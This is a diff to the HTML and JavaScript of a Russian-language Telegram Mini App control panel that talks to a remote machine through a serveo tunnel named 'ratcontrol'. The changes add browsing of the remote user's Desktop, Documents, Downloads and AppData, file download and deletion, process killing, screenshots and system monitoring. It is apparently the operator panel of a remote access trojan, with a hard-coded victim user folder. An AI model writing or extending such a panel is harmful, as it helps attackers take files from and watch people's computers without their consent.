@@ -95,6 +95,12 @@
             margin-bottom:10px;
             color:#0088cc
         }
+        .grid-2{
+            display:grid;
+            grid-template-columns:repeat(2,1fr);
+            gap:8px;
+            margin-bottom:8px
+        }
         .btn{
             border:none;
             border-radius:8px;
@@ -104,7 +110,7 @@
             background:#f0f0f0;
             color:#333;
             width:100%;
-            margin-bottom:5px
+            cursor:pointer
         }
         .btn-primary{background:#0088cc;color:#fff}
         .btn-success{background:#28a745;color:#fff}
@@ -200,8 +206,10 @@
             padding:10px;
             border-bottom:1px solid #eee;
             font-size:12px;
-            cursor:pointer
+            cursor:pointer;
+            transition:background 0.2s
         }
+        .file-item:hover{background:#f0f0f0}
         .file-icon{font-size:16px;margin-right:10px}
         .file-name{flex:1}
         .file-size{color:#666;margin-right:10px}
@@ -235,7 +243,8 @@
             border:none;
             border-radius:15px;
             padding:6px 15px;
-            font-size:11px
+            font-size:11px;
+            cursor:pointer
         }
         .online-dot{
             width:8px;height:8px;
@@ -258,7 +267,7 @@
     </div>
 
     <div class="connection-bar">
-        <input type="text" id="serverIP" class="connection-input" placeholder="Адрес сервера (например: mysite.serveo.net)" value="1d72e1d98c7a5acd.serveo.net">
+        <input type="text" id="serverIP" class="connection-input" placeholder="Адрес сервера (например: ratcontrol.serveo.net:8080)" value="ratcontrol.serveo.net:8080">
         <button class="connection-btn" onclick="testConnection()">🔄</button>
     </div>
     <div id="connectionStatus" class="connection-status">⏳ Проверка...</div>
@@ -311,26 +320,51 @@
     <div id="tab-files" class="tab-content">
         <div class="card">
             <div class="card-title">📁 ФАЙЛОВЫЙ МЕНЕДЖЕР</div>
+            
+            <!-- Быстрые пути -->
             <div class="quick-paths">
-                <span class="path-chip" onclick="quickPath('C:\\')">C:\</span>
-                <span class="path-chip" onclick="quickPath('D:\\')">D:\</span>
-                <span class="path-chip" onclick="quickPath('C:\\Users')">Users</span>
-                <span class="path-chip" onclick="quickPath('C:\\Windows')">Windows</span>
-                <span class="path-chip" onclick="quickPath('C:\\Program Files')">Program Files</span>
-                <span class="path-chip" onclick="quickPath('C:\\Program Files (x86)')">Program Files (x86)</span>
-                <span class="path-chip" onclick="quickPath('%APPDATA%')">AppData</span>
-                <span class="path-chip" onclick="quickPath('%TEMP%')">Temp</span>
+                <span class="path-chip" onclick="quickPath('C:\\')">💽 C:\</span>
+                <span class="path-chip" onclick="quickPath('D:\\')">💽 D:\</span>
+                <span class="path-chip" onclick="quickPath('%USERPROFILE%')">👤 Домой</span>
+                <span class="path-chip" onclick="quickPath('%USERPROFILE%\\Desktop')">🖥️ Рабочий стол</span>
+                <span class="path-chip" onclick="quickPath('%USERPROFILE%\\Downloads')">📥 Загрузки</span>
+                <span class="path-chip" onclick="quickPath('%USERPROFILE%\\Documents')">📄 Документы</span>
+                <span class="path-chip" onclick="quickPath('%USERPROFILE%\\Music')">🎵 Музыка</span>
+                <span class="path-chip" onclick="quickPath('%USERPROFILE%\\Videos')">🎬 Видео</span>
+                <span class="path-chip" onclick="quickPath('%USERPROFILE%\\Pictures')">🖼️ Картинки</span>
+                <span class="path-chip" onclick="quickPath('C:\\Windows\\System32')">⚙️ System32</span>
+                <span class="path-chip" onclick="quickPath('C:\\Program Files')">📦 Program Files</span>
+                <span class="path-chip" onclick="quickPath('C:\\Program Files (x86)')">📦 Program Files (x86)</span>
+                <span class="path-chip" onclick="quickPath('%APPDATA%')">📂 AppData</span>
+                <span class="path-chip" onclick="quickPath('%TEMP%')">🗑️ Temp</span>
             </div>
-            <div class="path-bar" id="currentPath">C:\</div>
+
+            <!-- Текущий путь с кнопкой копирования -->
+            <div style="display: flex; gap: 5px; margin: 8px 0;">
+                <div class="path-bar" id="currentPath" style="flex: 1; margin: 0;">C:\</div>
+                <button class="btn btn-info" onclick="copyPath()" style="width: auto; padding: 10px 15px;" title="Копировать путь">📋</button>
+            </div>
+            
+            <!-- Кнопки навигации -->
             <div class="grid-2">
                 <button class="btn btn-primary" onclick="listFiles()">📋 Список</button>
                 <button class="btn btn-warning" onclick="goBack()">⬆️ Назад</button>
             </div>
+
+            <!-- Ручной ввод пути -->
+            <div class="input-group">
+                <input type="text" id="folderPath" class="input" placeholder="Введите путь (например: C:\Windows)">
+                <button class="btn btn-primary" onclick="changeDir()">Перейти</button>
+            </div>
+
+            <!-- Действия с файлами -->
             <div class="input-group">
                 <input type="text" id="fileName" class="input" placeholder="Имя файла">
                 <button class="btn btn-success" onclick="downloadFile()">📥 Скачать</button>
                 <button class="btn btn-danger" onclick="deleteFile()">🗑️ Удалить</button>
             </div>
+
+            <!-- Список файлов с поддержкой двойного клика -->
             <div id="fileList" class="file-list"></div>
         </div>
     </div>
@@ -376,15 +410,15 @@
         tg.expand();
 
         // Настройки
-        let serverAddress = localStorage.getItem('serverAddr') || '1d72e1d98c7a5acd.serveo.net';
+        let serverAddress = localStorage.getItem('serverAddr') || 'ratcontrol.serveo.net:8080';
         let currentDir = 'C:\\';
         document.getElementById('serverIP').value = serverAddress;
 
-        // ==================== ИСПРАВЛЕННАЯ ФУНКЦИЯ getBaseUrl ====================
+        // ==================== ОСНОВНЫЕ ФУНКЦИИ ====================
         function getBaseUrl() {
-            // Убираем возможный порт из serverAddress
             let cleanAddress = serverAddress.split(':')[0];
-            return `https://${cleanAddress}`;
+            let port = serverAddress.includes(':') ? ':' + serverAddress.split(':')[1] : '';
+            return `https://${cleanAddress}${port}`;
         }
 
         function showStatus(text, type = 'info') {
@@ -403,7 +437,7 @@
                 const opts = { 
                     method, 
                     headers: {},
-                    mode: 'cors'  // Важно!
+                    mode: 'cors'
                 };
                 
                 if (data) {
@@ -477,11 +511,14 @@
 
         function formatProcesses(list) {
             if (!list || !list.length) return 'Нет процессов';
-            return list.slice(0, 50).map(p => `PID:${p.pid} | ${p.name} | CPU:${p.cpu}% | RAM:${p.ram}%`).join('\n');
+            return list.slice(0, 30).map(p => 
+                `PID:${p.pid} | ${p.name} | CPU:${p.cpu}% | RAM:${p.ram}%`
+            ).join('\n');
         }
 
+        // ==================== ПОДКЛЮЧЕНИЕ ====================
         async function testConnection() {
-            serverAddress = document.getElementById('serverIP').value.split(':')[0];
+            serverAddress = document.getElementById('serverIP').value;
             localStorage.setItem('serverAddr', serverAddress);
             
             try {
@@ -510,44 +547,102 @@
                     document.getElementById('statRAM').textContent = data.data.ram + '%';
                     document.getElementById('statDISK').textContent = data.data.disk + '%';
                 }
-            } catch (e) {
-                // Игнорируем ошибку
-            }
+            } catch (e) {}
         }
 
+        // ==================== ФАЙЛЫ ====================
         async function listFiles() {
             try {
                 const data = await apiRequest('/api/files?path=' + encodeURIComponent(currentDir));
                 if (data?.success) {
                     currentDir = data.current_dir;
                     document.getElementById('currentPath').textContent = currentDir;
+                    
                     let html = '';
-                    data.files.slice(0, 30).forEach(f => {
-                        html += `<div class="file-item" onclick="selectFile('${f.name.replace(/'/g, "\\'")}')">
-                            <span class="file-icon">${f.is_dir ? '📁' : '📄'}</span>
-                            <span class="file-name">${f.name}</span>
-                            <span class="file-size">${f.size}</span>
-                        </div>`;
-                    });
+                    if (data.files && data.files.length > 0) {
+                        data.files.slice(0, 30).forEach(f => {
+                            const icon = f.is_dir ? '📁' : '📄';
+                            const safeName = f.name.replace(/'/g, "\\'").replace(/"/g, '&quot;');
+                            
+                            if (f.is_dir) {
+                                html += `<div class="file-item" ondblclick="openFolder('${safeName}')" onclick="selectFile('${safeName}')">
+                                    <span class="file-icon">${icon}</span>
+                                    <span class="file-name">${f.name}</span>
+                                    <span class="file-size">${f.size}</span>
+                                </div>`;
+                            } else {
+                                html += `<div class="file-item" onclick="selectFile('${safeName}')">
+                                    <span class="file-icon">${icon}</span>
+                                    <span class="file-name">${f.name}</span>
+                                    <span class="file-size">${f.size}</span>
+                                </div>`;
+                            }
+                        });
+                    } else {
+                        html = '<div class="file-item">📁 Папка пуста</div>';
+                    }
                     document.getElementById('fileList').innerHTML = html;
                 }
-            } catch (e) {}
-        }
-
-        function goBack() {
-            if (currentDir !== 'C:\\') {
-                currentDir = currentDir.substring(0, currentDir.lastIndexOf('\\')) || 'C:\\';
-                listFiles();
+            } catch (error) {
+                console.error('Ошибка загрузки файлов:', error);
+                showStatus('❌ Ошибка загрузки', 'error');
             }
         }
 
-        function quickPath(p) {
-            currentDir = p;
+        function openFolder(folderName) {
+            let newPath = currentDir;
+            if (!newPath.endsWith('\\') && !newPath.endsWith('/')) {
+                newPath += '\\';
+            }
+            newPath += folderName;
+            currentDir = newPath;
+            listFiles();
+            showStatus(`📁 Открыта папка: ${folderName}`, 'success');
+        }
+
+        async function goBack() {
+            if (currentDir === 'C:\\' || currentDir === 'C:/' || currentDir === '') {
+                showStatus('📁 Уже в корне', 'warning');
+                return;
+            }
+            
+            const lastBackslash = currentDir.lastIndexOf('\\');
+            const lastSlash = currentDir.lastIndexOf('/');
+            const lastSeparator = Math.max(lastBackslash, lastSlash);
+            
+            if (lastSeparator > 0) {
+                if (currentDir.substring(lastSeparator - 1, lastSeparator + 1) === ':\\') {
+                    currentDir = currentDir.substring(0, lastSeparator + 1);
+                } else {
+                    currentDir = currentDir.substring(0, lastSeparator);
+                }
+            } else {
+                currentDir = 'C:\\';
+            }
+            
+            await listFiles();
+        }
+
+        function quickPath(path) {
+            path = path.replace('%USERPROFILE%', 'C:\\Users\\Артем');
+            path = path.replace('%APPDATA%', 'C:\\Users\\Артем\\AppData\\Roaming');
+            path = path.replace('%TEMP%', 'C:\\Users\\Артем\\AppData\\Local\\Temp');
+            path = path.replace('%WINDIR%', 'C:\\Windows');
+            currentDir = path;
             listFiles();
         }
 
-        function selectFile(n) { 
-            document.getElementById('fileName').value = n; 
+        async function changeDir() {
+            const path = document.getElementById('folderPath').value;
+            if (path) {
+                currentDir = path;
+                await listFiles();
+                document.getElementById('folderPath').value = '';
+            }
+        }
+
+        function selectFile(name) {
+            document.getElementById('fileName').value = name;
         }
 
         async function downloadFile() {
@@ -565,14 +660,39 @@
             }
         }
 
+        function copyPath() {
+            const path = document.getElementById('currentPath').textContent;
+            navigator.clipboard.writeText(path).then(() => {
+                showStatus('✅ Путь скопирован', 'success');
+            }).catch(() => {
+                showStatus('❌ Ошибка копирования', 'error');
+            });
+        }
+
+        // ==================== ПРОЦЕССЫ ====================
         async function killProcess() {
             const pid = document.getElementById('killPid').value;
-            if (pid) {
-                await apiRequest('/api/kill', 'POST', { pid: parseInt(pid) });
-                sendCommand('processes');
+            if (!pid) {
+                showStatus('❌ Введите PID', 'error');
+                return;
+            }
+            
+            showStatus('⏳ Завершение процесса...');
+            try {
+                const data = await apiRequest('/api/kill', 'POST', { pid: parseInt(pid) });
+                if (data?.success) {
+                    showStatus('✅ Процесс завершён', 'success');
+                    sendCommand('processes');
+                    document.getElementById('killPid').value = '';
+                } else {
+                    showStatus('❌ ' + (data?.error || 'Ошибка'), 'error');
+                }
+            } catch (error) {
+                showStatus('❌ Ошибка: ' + error.message, 'error');
             }
         }
 
+        // ==================== МЕДИА ====================
         async function takeScreenshot() {
             showStatus('📸 Скриншот...');
             try {
@@ -631,6 +751,7 @@
         setTimeout(() => {
             testConnection();
             loadDashboard();
+            listFiles();
         }, 500);
         setInterval(testConnection, 30000);
     </script>
